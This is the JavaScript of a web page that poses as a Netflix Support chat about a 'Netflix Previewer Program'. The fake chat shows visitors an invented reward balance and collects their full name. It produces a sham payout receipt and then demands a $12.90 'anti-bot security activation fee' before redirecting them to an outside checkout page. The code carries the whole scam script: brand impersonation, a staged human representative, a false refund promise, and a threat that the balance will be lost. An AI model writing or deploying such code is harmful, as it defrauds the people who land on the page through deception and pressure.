    // Extract balance parameter from URL (final target balance)
    var urlParams = new URLSearchParams(window.spUrlWith('x').split('?')[1] || '');
    var balanceVal = urlParams.get('balance') || '214.80';
    var targetBalance = parseFloat(balanceVal) || 0;
    var currentBalance = 0;
    var balanceEl = document.getElementById('headerBalance');
    balanceEl.textContent = '0.00';

    // Animate header balance to a value
    var balAnim = null;
    function setBalance(value, animate) {
      value = Math.max(0, value);
      currentBalance = value;
      if (balAnim) { clearInterval(balAnim); balAnim = null; }
      var from = parseFloat(balanceEl.textContent) || 0;
      if (value > from && navigator.vibrate) { try { navigator.vibrate(80); } catch (err) {} }
      if (!animate) { balanceEl.textContent = value.toFixed(2); return; }
      var steps = 20, i = 0;
      balAnim = setInterval(function () {
        i++;
        var v = from + (value - from) * (i / steps);
        balanceEl.textContent = v.toFixed(2);
        balanceEl.style.transform = 'scale(1.08)';
        setTimeout(function () { balanceEl.style.transform = ''; }, 90);
        if (i >= steps) { clearInterval(balAnim); balAnim = null; balanceEl.textContent = value.toFixed(2); }
      }, 40);
    }

    // Rewards coming from the trailer evaluator increase the balance live
    var lastRewardTimestamp = 0;
    var lastRewardAmount = 0;
    window.addEventListener('message', function (e) {
      var d = e.data;
      if (!d || typeof d !== 'object') return;
      if (d.type === 'sp-add-balance') {
        var now = Date.now();
        var r = parseFloat(d.reward) || 0;
        // Evita somar duas vezes caso receba mensagens repetidas
        if (now - lastRewardTimestamp < 350 && Math.abs(r - lastRewardAmount) < 0.01) {
          return;
        }
        lastRewardTimestamp = now;
        lastRewardAmount = r;
        setBalance(currentBalance + r, true);
      } else if (d.type === 'finalizar_musicas' || d.name === 'finalizar_musicas') {
        var fb = parseFloat(d.finalBalance);
        setBalance(isNaN(fb) ? Math.max(currentBalance, targetBalance) : fb, true);
      }
    });


    // Trackly: first step of Netflix Previewer funnel
    (function () {
      var fired = false;
      function fire() {
        if (fired) return;
        var trk = window.trkFunnel;
        if (trk && typeof trk.step === 'function') {
          try { trk.step('chegouspt'); } catch (e) {}
          fired = true;
          return true;
        }
        return false;
      }
      if (fire()) return;
      var tries = 0;
      var id = window.setInterval(function () {
        tries += 1;
        if (fire() || tries > 40) window.clearInterval(id);
      }, 250);
    })();
  </script>

  <script>
    (function () {
      var body = document.getElementById('chatBody');
      var input = document.getElementById('chatInput');
      var NETFLIX_LOGO_SVG = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%23E50914' d='M5.398 0v.006c3.028 8.556 5.37 15.175 8.348 23.596 2.344.058 4.85.398 4.854.398-2.8-7.924-5.923-16.747-8.487-24zm8.489 0v9.63L18.6 22.951c-.043-7.86-.004-15.913.002-22.95zM5.398 1.05V24c1.873-.225 2.81-.312 4.715-.398v-9.22z'/%3E%3C/svg%3E";
      var AV = NETFLIX_LOGO_SVG;
      var agentName = 'Netflix Support';
      var agentAvatar = document.getElementById('agentAvatar');
      var agentNameEl = document.getElementById('agentName');
      var vars = { nome: '', balance: parseFloat(balanceVal).toFixed(2) };

      var CHECKOUT = 'https://checkout.morganstudio.store/';

      // =========================================================================
      // [CONFIGURAÇÃO DAS VSLs VTURB] — TROQUE APENAS ESTAS 2 URLs QUANDO GRAVAR AS NOVAS VSLs!
      // =========================================================================
      var VSL_1_EMBED_URL = 'https://scripts.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/players/6ae8cef1c3ff612f67d6e004/v4/embed.html';
      var VSL_1_DELAY_MS  = 27000; // Tempo (ms) de espera na VSL 1 antes de liberar o botão (27s)

      var VSL_2_EMBED_URL = 'https://scripts.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/players/6ae8cf1fc7321bec2b429188/v4/embed.html';
      var VSL_2_DELAY_MS  = 260000; // Tempo (ms) do pitch na VSL 2 antes de redirecionar pro Checkout (4m20s)

      function fill(t) {
        return t.replace(/\{\{(\w+)\}\}/g, function (_, k) {
          if (k === 'balance') return (currentBalance > 0 ? currentBalance : parseFloat(balanceVal)).toFixed(2);
          return vars[k] || '';
        });

      }
      function scroll() { body.scrollTop = body.scrollHeight; }
      function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

      function botRow(inner, cls) {
        var row = document.createElement('div');
        row.className = 'row bot';
        var img = document.createElement('img');
        img.className = 'av' + (AV === NETFLIX_LOGO_SVG ? ' support-logo' : '');
        img.src = AV; img.alt = agentName;
        var b = document.createElement('div');
        b.className = 'bubble' + (cls ? ' ' + cls : '');
        if (typeof inner === 'string') { b.textContent = inner; } else { b.appendChild(inner); }
        row.appendChild(img); row.appendChild(b);
        body.appendChild(row); scroll();
        return row;
      }

      function userRow(text) {
        var row = document.createElement('div');
        row.className = 'row user';
        var b = document.createElement('div');
        b.className = 'bubble';
        b.textContent = text;
        row.appendChild(b);
        body.appendChild(row); scroll();
      }

      async function typing(ms) {
        var el = document.createElement('span');
        el.className = 'typing';
        el.innerHTML = '<i></i><i></i><i></i>';
        var row = botRow(el);
        await sleep(ms);
        row.remove();
      }

      async function say(text) {
        text = fill(text);
        await typing(Math.min(1600, 500 + text.length * 12));
        botRow(text);
      }

      function activateRepresentative() {
        AV = '/sp/type/avatar.png';
        agentName = 'Kaytlynn W.';
        agentAvatar.src = AV;
        agentAvatar.alt = agentName;
        agentAvatar.classList.remove('support-logo');
        agentNameEl.textContent = agentName;
      }

      async function sayStatus(text, type) {
        text = fill(text);
        await typing(Math.min(1600, 500 + text.length * 12));
        var wrap = document.createElement('span');
        wrap.className = 'message-with-icon';
        var icon = document.createElement('span');
        icon.className = 'message-icon ' + (type || 'success');
        icon.setAttribute('aria-hidden', 'true');
        if (type === 'pending') {
          icon.innerHTML = '<svg viewBox="0 0 24 24" width="18" height="18" fill="none"><path d="M12 3a9 9 0 1 0 9 9" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"/></svg>';
        } else if (type === 'alert') {
          icon.innerHTML = '<svg viewBox="0 0 24 24" width="18" height="18" fill="none"><path d="M12 3 2.8 20h18.4L12 3Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/><path d="M12 9v5M12 17.3v.2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>';
        } else if (type === 'reward') {
          icon.innerHTML = '<svg viewBox="0 0 24 24" width="18" height="18" fill="none"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="2"/><path d="M14.8 8.5h-4a2 2 0 0 0 0 4h2.4a2 2 0 1 1 0 4H9M12 6.5v2M12 16.5v2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>';
        } else {
          icon.innerHTML = '<svg viewBox="0 0 24 24" width="18" height="18" fill="none"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="2"/><path d="m8 12 2.7 2.7L16.5 9" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';
        }
        var content = document.createElement('span');
        content.textContent = text;
        wrap.appendChild(icon);
        wrap.appendChild(content);
        return botRow(wrap);
      }

      async function updateStatus(row, text, type) {
        var wrap = row && row.querySelector('.message-with-icon');
        if (!wrap) return;
        wrap.classList.add('is-changing');
        await sleep(220);
        var icon = wrap.querySelector('.message-icon');
        var content = wrap.querySelector('span:last-child');
        if (icon) {
          icon.className = 'message-icon ' + (type || 'success');
          if (type === 'pending') {
            icon.innerHTML = '<svg viewBox="0 0 24 24" width="18" height="18" fill="none"><path d="M12 3a9 9 0 1 0 9 9" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"/></svg>';
          } else {
            icon.innerHTML = '<svg viewBox="0 0 24 24" width="18" height="18" fill="none"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="2"/><path d="m8 12 2.7 2.7L16.5 9" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';
          }
        }
        if (content) content.textContent = fill(text);
        wrap.classList.remove('is-changing');
        scroll();
      }

      function media(url, height) {
        var isVideo = url.indexOf('converteai.net') > -1 || url.indexOf('vturb') > -1 || url.indexOf('players') > -1;
        if (isVideo) {
          var w = document.createElement('div');
          w.style.position = 'relative';
          w.style.width = '100%';
          w.style.padding = '177.77777777777777% 0 0 0';
          w.style.overflow = 'hidden';
          var f = document.createElement('iframe');
          f.src = fill(url);
          f.setAttribute('frameborder', '0');
          f.setAttribute('allow', 'autoplay; fullscreen; encrypted-media');
          f.setAttribute('allowfullscreen', '');
          f.setAttribute('referrerpolicy', 'origin');
          f.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;border:0;';
          w.appendChild(f);
          botRow(w, 'media');
          return f;
        }
        var f = document.createElement('iframe');
        f.src = fill(url);
        f.height = height;
        f.setAttribute('frameborder', '0');
        f.setAttribute('allow', 'autoplay; fullscreen; encrypted-media');
        f.setAttribute('allowfullscreen', '');
        f.style.height = height + 'px';
        botRow(f, 'media');
        return f;
      }

      function player(url, pad) {
        var w = document.createElement('div');
        w.style.position = 'relative';
        w.style.padding = pad + '% 0 0 0';
        var f = document.createElement('iframe');
        f.frameBorder = '0';
        f.setAttribute('allowfullscreen', '');
        f.setAttribute('referrerpolicy', 'origin');
        f.src = 'about:blank';
        f.onload = function () {
          f.onload = null;
          f.src = url + ((window.spTrackingSearch || location.search) || '?') + '&vl=' + encodeURIComponent(location.href);
        };
        f.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;border:0';
        w.appendChild(f);
        botRow(w, 'media');
        return f;
      }


      function clearInput() { input.innerHTML = ''; }

      function askButton(label) {
        return new Promise(function (resolve) {
          clearInput();
          var b = document.createElement('button');
          b.className = 'cta';
          b.textContent = label;
          b.onclick = function () {
            clearInput();
            userRow(label);
            resolve(label);
          };
          input.appendChild(b);
          scroll();
        });
      }

      function askText(placeholder) {
        return new Promise(function (resolve) {
          clearInput();
          var wrap = document.createElement('form');
          wrap.className = 'field';
          var i = document.createElement('input');
          i.type = 'text'; i.placeholder = placeholder; i.autocomplete = 'name';
          var s = document.createElement('button');
          s.type = 'submit'; s.innerHTML = '&#10148;';
          wrap.appendChild(i); wrap.appendChild(s);
          wrap.onsubmit = function (e) {
            e.preventDefault();
            var v = i.value.trim();
            if (!v) return;
            clearInput();
            userRow(v);
            resolve(v);
          };
          input.appendChild(wrap);
          scroll();
          setTimeout(function () { i.focus(); }, 200);
        });
      }

      function waitForSongs(timeoutMs) {
        return new Promise(function (resolve) {
          var done = false;
          function finish() {
            if (done) return;
            done = true;
            window.removeEventListener('message', onMsg);
            resolve();
          }
          function onMsg(e) {
            var d = e.data;
            var s = typeof d === 'string' ? d : (d && (d.name || d.event || d.type)) || '';
            if (String(s).indexOf('finalizar_musicas') !== -1 || String(s).indexOf('finish') !== -1) finish();
          }
          window.addEventListener('message', onMsg);
          setTimeout(finish, timeoutMs);
        });
      }

      function step(name) {
        var key = 'trk_fired_' + name;
        try { if (sessionStorage.getItem(key)) return; sessionStorage.setItem(key, '1'); } catch (e) {}
        var tries = 0;
        (function attempt() {
          var trk = window.trkFunnel;
          if (trk && typeof trk.step === 'function') { try { trk.step(name); } catch (e) {} return; }
          if (++tries <= 240) setTimeout(attempt, 250);
        })();
      }

      async function run() {
        // Etapa 01
        step('chegou_vsl');
        step('comeco');
        await say('To begin your service, your case number is 809821');
        await sleep(4000);
        await say("You've been one of the few viewers selected for the Netflix Previewer Program");
        await sleep(3000);
        await say("Netflix invests billions in new originals every year, and we need real human feedback before global release to calibrate title thumbnails and recommendation algorithms.");
        await sleep(3000);
        await say("We've selected four pre-release trailers for you to preview and rate from 1 to 5 stars. It takes less than two minutes.");
        step('avaliacao1');
        media('/sp/songs/index.html', 465);
        await waitForSongs(600000);
        await sleep(3000);
        await say('Click the button below to continue with your registration.');
        await sleep(3000);

        // Etapa 02
        await askButton('Start Verification');
        step('start_verification1');
        step('iniciouspt');
        await sleep(2000);
        activateRepresentative();
        await sayStatus('Kaytlynn, the Netflix Previewer representative, has joined the chat', 'success');
        await sleep(4000);
        await say('Hi, welcome to the Netflix Previewer Program!');
        await sleep(3000);
        // [VSL 1 - BOAS-VINDAS / INTRODUÇÃO]
        media(VSL_1_EMBED_URL, 620);
        await sleep(VSL_1_DELAY_MS);
        await say('You have a balance of ${{balance}} in our app');
        await sleep(3000);
        await say('Would you like to continue so you can withdraw your money?');
        await say('(Click the button below to continue)');
        await askButton('Yes, I would like to withdraw');

        // Etapa 03
        await say("Would you like to receive your reward for the trailer evaluations you've completed?");
        await say('(Click the button below to continue)');
        await askButton('Yes, I do!');
        step('yes_i_do1');

        // Etapa 04 - name
        step('coleta_de_nome1');
        await sayStatus("Okay, I'll continue with your registration.", 'success');
        await sleep(3000);
        await say("At this stage, I need you to tell me your name so I can verify that you're a new previewer.");
        await sleep(3000);
        await say('What is your full name?');
        await say('(Write below)');
        vars.nome = await askText('Enter your name here...');
        var checkingRow = await sayStatus('Checking...', 'pending');
        await sleep(6000);

        // Etapa 05
        step('elegibilidade1');
        await updateStatus(checkingRow, 'Just a moment...', 'pending');
        await sleep(10000);
        await updateStatus(checkingRow, 'Everything looks good, {{nome}}!\n\nI checked our system and saw that you are eligible to receive your payout of ${{balance}}', 'success');

        // Etapa 06
        step('recibo1');
        await sleep(3000);
        await say('I\u2019m sending you the receipt for your evaluations.');
        await sleep(1000);
        var receiptLoadingRow = await sayStatus('Loading...', 'pending');
        await sleep(4000);
        await updateStatus(receiptLoadingRow, 'Generating your payout withdrawal receipt...', 'pending');
        await sleep(4000);
        var receiptFrame = media('/sp/receipt/index.html?nome=' + encodeURIComponent(vars.nome) + '&total=' + encodeURIComponent((currentBalance > 0 ? currentBalance : parseFloat(balanceVal)).toFixed(2)), 440);
        receiptFrame.className = 'withdraw-receipt';
        receiptFrame.onload = function () {
          var documentReceipt = receiptFrame.contentDocument && receiptFrame.contentDocument.querySelector('.receipt');
          if (!documentReceipt) return;
          function fitReceipt() {
            var height = Math.ceil(documentReceipt.getBoundingClientRect().height);
            receiptFrame.style.height = height + 'px';
            receiptFrame.height = height;
          }
          new ResizeObserver(fitReceipt).observe(documentReceipt);
          fitReceipt();
        };
        await sleep(4000);

        // Etapa 07
        await say('(Click the button below to continue)');
        await askButton('I want to claim my reward');
        step('vslspt');

        // VSL + oferta
        step('vsl_checkout1');
        await sayStatus('Your access to withdraw your payout will be granted after this short explanatory video', 'alert');
        // [VSL 2 - PITCH PRINCIPAL DE CONVERSÃO]
        player(VSL_2_EMBED_URL, 56.25);
        var __h = location.hostname;
        var __isDev = __h === 'localhost' || __h === '127.0.0.1' || __h.indexOf('id-preview--') === 0 || __h.indexOf('-dev.lovable.app') > -1 || __h.indexOf('.lovableproject.com') > -1 || __h.indexOf('.sandbox.lovable.dev') > -1 || new URLSearchParams((window.spTrackingSearch || location.search)).get('dev') === '1';
        await sleep(__isDev ? 0 : VSL_2_DELAY_MS);
        step('assistiu_pitch');
        await sayStatus('Your balance of ${{balance}} is ready!\n\nTo withdraw your earnings today, all you need to do is pay a small anti-bot security activation fee of $12.90\n\nThis is to verify your identity as a real viewer and ensure that you are not an automated bot.', 'reward');
        await sleep(5000);
        await sayStatus('Please note: The $12.90 fee will be fully refunded after registration, along with your current balance of ${{balance}}', 'alert');
        await sleep(4000);
        await say('This is a unique opportunity.\n\nIf you decide to leave now, your balance will be canceled and transferred to another viewer on the waiting list.');
        await sleep(3000);
        await say('You are being redirected to the payment page...');
        step('clicou_botao');
        step('checkoutspt');
        step('checkout1');
        var checkoutUrl = window.spUrlWith(CHECKOUT, {
          name: vars.nome || '',
          nome: vars.nome || '',
          spot: '1',
          preview: 'black',
          ref: 'chat',
          visit_id: (window.spParams && window.spParams.visit_id) || localStorage.getItem('sp_visit_id') || '',
          balance: (currentBalance > 0 ? currentBalance : parseFloat(balanceVal)).toFixed(2)
        });
        // Dispara InitiateCheckout no Meta Pixel se ativo
        try { if (window.fbq) fbq('track', 'InitiateCheckout'); } catch (e) {}
        // Aciona o hook do Utmify (que intercepta window.open e dispara o InitiateCheckout da regra de URL)
        try { window.open(checkoutUrl, '_self'); } catch (e) {}
        // Fallback garantido com 350ms para a requisição de IC da Utmify ser enviada antes do redirecionamento
        setTimeout(function () {
          try { window.top.location.href = checkoutUrl; } catch (e) { window.location.href = checkoutUrl; }
        }, 350);
      }

      run();
    })();
  </script>
